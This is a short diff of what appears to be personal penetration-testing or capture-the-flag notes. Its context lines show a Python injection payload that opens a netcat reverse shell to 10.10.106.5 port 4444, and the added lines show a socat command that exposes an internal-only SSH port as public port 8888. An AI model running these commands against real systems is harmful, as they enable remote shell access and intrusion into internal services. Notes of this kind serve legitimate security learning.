@@ -211,3 +211,9 @@ In the above, exploiting https://www.exploit-db.com/exploits/42033, I know the p
 If able to inject some python script, e.g. into unsanitised input, this can work:
 
 `__import__('os').popen('nc 10.10.106.5 4444 -e /bin/sh').read()`
+
+## Exposing a new port to access something internal
+
+E.g. this will expose an internal only port 22 as a public port 8888
+
+`/tmp/socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22`
